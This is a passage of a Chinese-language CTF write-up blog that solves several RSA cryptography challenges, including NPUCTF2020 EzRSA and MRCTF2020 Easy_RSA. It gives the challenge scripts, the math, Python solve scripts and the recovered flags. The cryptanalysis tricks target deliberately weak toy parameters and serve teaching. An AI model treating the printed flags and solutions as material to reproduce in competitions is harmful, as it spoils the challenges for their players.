m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>Ciphertext<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># b'MRCTF&#123;sti11_@_b@by_qu3st10n&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="NPUCTF2020-EzRSA"><a href="#NPUCTF2020-EzRSA" class="headerlink" title="[NPUCTF2020]EzRSA"></a>[NPUCTF2020]EzRSA</h4><p><strong>TAG：给出p-1、q-1的最小公倍数</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> lcm<span class="token punctuation">,</span> powmod<span class="token punctuation">,</span> invert<span class="token punctuation">,</span> gcd<span class="token punctuation">,</span> mpz
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime
<span class="token keyword">from</span> sympy <span class="token keyword">import</span> nextprime
<span class="token keyword">from</span> random <span class="token keyword">import</span> randint

p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
n <span class="token operator">=</span> p <span class="token operator">*</span> q
gift <span class="token operator">=</span> lcm<span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
e <span class="token operator">=</span> <span class="token number">54722</span>
flag <span class="token operator">=</span> <span class="token string">b'NPUCTF&#123;******************&#125;'</span>
m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token string">'big'</span><span class="token punctuation">)</span>
c <span class="token operator">=</span> powmod<span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n: '</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'gift: '</span><span class="token punctuation">,</span> gift<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c: '</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>
<span class="token triple-quoted-string string">"""
n = 17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121
gift = 2135492653776686212553329560560967285303308936825887355911916917454772197960682240149821138177216833586509090969892419775958406087994054585022894165950768427741545736247918410255804894522085720642952579638418483800243368312702566458196708508543635051350999572787188236243275631609875253617015664414032058822919469443284453403064076232765024248435543326597418851751586308514540124571309152787559712950209357825576896132278045112177910266019741013995106579484868768251084453338417115483515132869594712162052362083414163954681306259137057581036657441897428432575924018950961141822554251369262248368899977337886190114104
c = 3738960639194737957667684143565005503596276451617922474669745529299929395507971435311181578387223323429323286927370576955078618335757508161263585164126047545413028829873269342924092339298957635079736446851837414357757312525158356579607212496060244403765822636515347192211817658170822313646743520831977673861869637519843133863288550058359429455052676323196728280408508614527953057214779165450356577820378810467527006377296194102671360302059901897977339728292345132827184227155061326328585640019916328847372295754472832318258636054663091475801235050657401857262960415898483713074139212596685365780269667500271108538319
"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>给出的gift可以看到是非常接近于n的，而这个最小公倍数的最大值为<code>(p-1)*(q-1)</code>，是不可能比n更大的，所以这里我们可以尝试对<code>(p-1)*(q-1)</code>也就是<code>phi</code>进行爆破，下面写出解题脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> lcm<span class="token punctuation">,</span> powmod<span class="token punctuation">,</span> invert<span class="token punctuation">,</span> gcd<span class="token punctuation">,</span> mpz<span class="token punctuation">,</span> isqrt
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> long_to_bytes
<span class="token keyword">from</span> sympy <span class="token keyword">import</span> nextprime
<span class="token keyword">from</span> random <span class="token keyword">import</span> randint
<span class="token triple-quoted-string string">"""
p = getPrime(1024)
q = getPrime(1024)
n = p * q
gift = lcm(p - 1, q - 1)
e = 54722
flag = b'NPUCTF&#123;******************&#125;'
m = int.from_bytes(flag, 'big')
c = powmod(m, e, n)
print('n: ', n)
print('gift: ', gift)
print('c: ', c)
"""</span>
n <span class="token operator">=</span> <span class="token number">17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121</span>
gift <span class="token operator">=</span> <span class="token number">2135492653776686212553329560560967285303308936825887355911916917454772197960682240149821138177216833586509090969892419775958406087994054585022894165950768427741545736247918410255804894522085720642952579638418483800243368312702566458196708508543635051350999572787188236243275631609875253617015664414032058822919469443284453403064076232765024248435543326597418851751586308514540124571309152787559712950209357825576896132278045112177910266019741013995106579484868768251084453338417115483515132869594712162052362083414163954681306259137057581036657441897428432575924018950961141822554251369262248368899977337886190114104</span>
c <span class="token operator">=</span> <span class="token number">3738960639194737957667684143565005503596276451617922474669745529299929395507971435311181578387223323429323286927370576955078618335757508161263585164126047545413028829873269342924092339298957635079736446851837414357757312525158356579607212496060244403765822636515347192211817658170822313646743520831977673861869637519843133863288550058359429455052676323196728280408508614527953057214779165450356577820378810467527006377296194102671360302059901897977339728292345132827184227155061326328585640019916328847372295754472832318258636054663091475801235050657401857262960415898483713074139212596685365780269667500271108538319</span>
e <span class="token operator">=</span> <span class="token number">54722</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>gift<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    phi <span class="token operator">=</span> gift <span class="token operator">*</span> i
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
        d <span class="token operator">=</span> invert<span class="token punctuation">(</span>e <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
        m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>
        flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>isqrt<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>

<span class="token comment"># b'NPUCTF&#123;diff1cult_rsa_1s_e@sy&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个范围<code>[4, 8]</code>的原因是gift是2045bit，phi是2048位。而phi = lcm <em> gcd，`乘积(2048)=最小公倍数(2045)</em>最大公约数(3)<code>。故gcd的值为三个比特位，即</code>[4, 8]`。</p>
<p>而e不是素数，无法求出invert，这里把<code>e//2</code>，再将<code>m开平方</code>即可。</p>
<h4 id="MRCTF2020-Easy-RSA"><a href="#MRCTF2020-Easy-RSA" class="headerlink" title="[MRCTF2020]Easy_RSA"></a>[MRCTF2020]Easy_RSA</h4><p>给出的加密脚本如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy
<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> gcd<span class="token punctuation">,</span> invert
<span class="token keyword">from</span> random <span class="token keyword">import</span> randint
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> isPrime<span class="token punctuation">,</span> getRandomNBitInteger<span class="token punctuation">,</span> bytes_to_long<span class="token punctuation">,</span> long_to_bytes
<span class="token keyword">import</span> base64

<span class="token keyword">from</span> zlib <span class="token keyword">import</span> <span class="token operator">*</span>
flag <span class="token operator">=</span> <span class="token string">b"MRCTF&#123;XXXX&#125;"</span>
base <span class="token operator">=</span> <span class="token number">65537</span>

<span class="token keyword">def</span> <span class="token function">gen_prime</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>
    A <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
        A <span class="token operator">=</span> getPrime<span class="token punctuation">(</span>N<span class="token punctuation">)</span>
        <span class="token keyword">if</span> A <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
    <span class="token keyword">return</span> A

<span class="token keyword">def</span> <span class="token function">gen_p</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> <span class="token punctuation">(</span>p <span class="token operator">&lt;</span> q<span class="token punctuation">)</span>
    n <span class="token operator">=</span> p <span class="token operator">*</span> q
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"P_n = "</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    F_n <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"P_F_n = "</span><span class="token punctuation">,</span> F_n<span class="token punctuation">)</span>
    factor2 <span class="token operator">=</span> <span class="token number">2021</span> <span class="token operator">*</span> p <span class="token operator">+</span> <span class="token number">2020</span> <span class="token operator">*</span> q
    <span class="token keyword">if</span> factor2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        factor2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> factor2
    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>factor2<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">gen_q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> <span class="token punctuation">(</span>p <span class="token operator">&lt;</span> q<span class="token punctuation">)</span>
    n <span class="token operator">=</span> p <span class="token operator">*</span> q
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Q_n = "</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    e <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">53</span><span class="token punctuation">)</span>
    F_n <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> gcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span> F_n<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
        e <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">53</span><span class="token punctuation">)</span>
    d <span class="token operator">=</span> invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> F_n<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Q_E_D = "</span><span class="token punctuation">,</span> e <span class="token operator">*</span> d<span class="token punctuation">)</span>
    factor2 <span class="token operator">=</span> <span class="token number">2021</span> <span class="token operator">*</span> p <span class="token operator">-</span> <span class="token number">2020</span> <span class="token operator">*</span> q
    <span class="token keyword">if</span> factor2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        factor2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> factor2
    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>factor2<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    _E <span class="token operator">=</span> base
    _P <span class="token operator">=</span> gen_p<span class="token punctuation">(</span><span class="token punctuation">)</span>
    _Q <span class="token operator">=</span> gen_q<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> <span class="token punctuation">(</span>gcd<span class="token punctuation">(</span>_E<span class="token punctuation">,</span> <span class="token punctuation">(</span>_P <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>_Q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
    _M <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    _C <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>_M<span class="token punctuation">,</span> _E<span class="token punctuation">,</span> _P <span class="token operator">*</span> _Q<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Ciphertext = "</span><span class="token punctuation">,</span> _C<span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
P_n =  14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024336556028267742021320891681762543660468484018686865891073110757394154024833552558863671537491089957038648328973790692356014778420333896705595252711514117478072828880198506187667924020260600124717243067420876363980538994101929437978668709128652587073901337310278665778299513763593234951137512120572797739181693
P_F_n =  14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024099427363967321110127562039879018616082926935567951378185280882426903064598376668106616694623540074057210432790309571018778281723710994930151635857933293394780142192586806292968028305922173313521186946635709194350912242693822450297748434301924950358561859804256788098033426537956252964976682327991427626735740
Q_n =  20714298338160449749545360743688018842877274054540852096459485283936802341271363766157976112525034004319938054034934880860956966585051684483662535780621673316774842614701726445870630109196016676725183412879870463432277629916669130494040403733295593655306104176367902352484367520262917943100467697540593925707162162616635533550262718808746254599456286578409187895171015796991910123804529825519519278388910483133813330902530160448972926096083990208243274548561238253002789474920730760001104048093295680593033327818821255300893423412192265814418546134015557579236219461780344469127987669565138930308525189944897421753947
Q_E_D =  100772079222298134586116156850742817855408127716962891929259868746672572602333918958075582671752493618259518286336122772703330183037221105058298653490794337885098499073583821832532798309513538383175233429533467348390389323225198805294950484802068148590902907221150968539067980432831310376368202773212266320112670699737501054831646286585142281419237572222713975646843555024731855688573834108711874406149540078253774349708158063055754932812675786123700768288048445326199880983717504538825498103789304873682191053050366806825802602658674268440844577955499368404019114913934477160428428662847012289516655310680119638600315228284298935201
Ciphertext =  40855937355228438525361161524441274634175356845950884889338630813182607485910094677909779126550263304194796000904384775495000943424070396334435810126536165332565417336797036611773382728344687175253081047586602838685027428292621557914514629024324794275772522013126464926990620140406412999485728750385876868115091735425577555027394033416643032644774339644654011686716639760512353355719065795222201167219831780961308225780478482467294410828543488412258764446494815238766185728454416691898859462532083437213793104823759147317613637881419787581920745151430394526712790608442960106537539121880514269830696341737507717448946962021
'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里用到了有<code>e*d</code>和<code>n</code>求<code>phi</code>、有<code>phi</code>和<code>n</code>如何求<code>p、q</code>。注意，p和q的大小的问题。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy
<span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes


P_n <span class="token operator">=</span>  <span class="token number">14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024336556028267742021320891681762543660468484018686865891073110757394154024833552558863671537491089957038648328973790692356014778420333896705595252711514117478072828880198506187667924020260600124717243067420876363980538994101929437978668709128652587073901337310278665778299513763593234951137512120572797739181693</span>
P_F_n <span class="token operator">=</span>  <span class="token number">14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024099427363967321110127562039879018616082926935567951378185280882426903064598376668106616694623540074057210432790309571018778281723710994930151635857933293394780142192586806292968028305922173313521186946635709194350912242693822450297748434301924950358561859804256788098033426537956252964976682327991427626735740</span>
Q_n <span class="token operator">=</span>  <span class="token number">20714298338160449749545360743688018842877274054540852096459485283936802341271363766157976112525034004319938054034934880860956966585051684483662535780621673316774842614701726445870630109196016676725183412879870463432277629916669130494040403733295593655306104176367902352484367520262917943100467697540593925707162162616635533550262718808746254599456286578409187895171015796991910123804529825519519278388910483133813330902530160448972926096083990208243274548561238253002789474920730760001104048093295680593033327818821255300893423412192265814418546134015557579236219461780344469127987669565138930308525189944897421753947</span>
Q_E_D <span class="token operator">=</span>  <span class="token number">100772079222298134586116156850742817855408127716962891929259868746672572602333918958075582671752493618259518286336122772703330183037221105058298653490794337885098499073583821832532798309513538383175233429533467348390389323225198805294950484802068148590902907221150968539067980432831310376368202773212266320112670699737501054831646286585142281419237572222713975646843555024731855688573834108711874406149540078253774349708158063055754932812675786123700768288048445326199880983717504538825498103789304873682191053050366806825802602658674268440844577955499368404019114913934477160428428662847012289516655310680119638600315228284298935201</span>
Ciphertext <span class="token operator">=</span>  <span class="token number">40855937355228438525361161524441274634175356845950884889338630813182607485910094677909779126550263304194796000904384775495000943424070396334435810126536165332565417336797036611773382728344687175253081047586602838685027428292621557914514629024324794275772522013126464926990620140406412999485728750385876868115091735425577555027394033416643032644774339644654011686716639760512353355719065795222201167219831780961308225780478482467294410828543488412258764446494815238766185728454416691898859462532083437213793104823759147317613637881419787581920745151430394526712790608442960106537539121880514269830696341737507717448946962021</span>
e <span class="token operator">=</span> <span class="token number">65537</span>


<span class="token keyword">def</span> <span class="token function">solve_p</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">:</span>
    tmp1 <span class="token operator">=</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># =p+q</span>
    tmp2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> n<span class="token punctuation">)</span>  <span class="token comment"># =p-q</span>
    q <span class="token operator">=</span> <span class="token punctuation">(</span>tmp1 <span class="token operator">+</span> tmp2<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
    p <span class="token operator">=</span> n <span class="token operator">//</span> q
    factor2 <span class="token operator">=</span> <span class="token number">2021</span> <span class="token operator">*</span> p <span class="token operator">+</span> <span class="token number">2020</span> <span class="token operator">*</span> q
    <span class="token keyword">if</span> factor2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        factor2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> factor2
    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>factor2<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">solve_q</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">:</span>
    tmp1 <span class="token operator">=</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># =p+q</span>
    tmp2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> n<span class="token punctuation">)</span>  <span class="token comment"># =p-q</span>
    q <span class="token operator">=</span> <span class="token punctuation">(</span>tmp1 <span class="token operator">+</span> tmp2<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
    p <span class="token operator">=</span> n <span class="token operator">//</span> q
    factor2 <span class="token operator">=</span> <span class="token number">2021</span> <span class="token operator">*</span> p <span class="token operator">-</span> <span class="token number">2020</span> <span class="token operator">*</span> q
    <span class="token keyword">if</span> factor2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        factor2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> factor2
    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>factor2<span class="token punctuation">)</span>


p <span class="token operator">=</span> solve_p<span class="token punctuation">(</span>P_n<span class="token punctuation">,</span> P_F_n<span class="token punctuation">)</span>

K <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Q_E_D <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> Q_n<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
phiq <span class="token operator">=</span> <span class="token punctuation">(</span>Q_E_D <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> K

q <span class="token operator">=</span> solve_q<span class="token punctuation">(</span>Q_n<span class="token punctuation">,</span> phiq<span class="token punctuation">)</span>
n <span class="token operator">=</span> p <span class="token operator">*</span> q
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>Ciphertext<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># b'MRCTF&#123;Ju3t_@_31mp13_que3t10n&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="De1CTF2019-babyrsa"><a href="#De1CTF2019-babyrsa" class="headerlink" title="[De1CTF2019]babyrsa"></a>[De1CTF2019]babyrsa</h4><p><strong>TAG: 复杂rsa的典范、中国剩余定理求解、小指数攻击</strong></p>
<p>这里</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii
<span class="token keyword">from</span> data <span class="token keyword">import</span> e1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q1p<span class="token punctuation">,</span> q1q<span class="token punctuation">,</span> hint<span class="token punctuation">,</span> flag

n <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423</span><span class="token punctuation">,</span>
    <span class="token number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421</span><span class="token punctuation">,</span>
    <span class="token number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303</span><span class="token punctuation">,</span>
    <span class="token number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791</span><span class="token punctuation">]</span>
c <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569</span><span class="token punctuation">,</span>
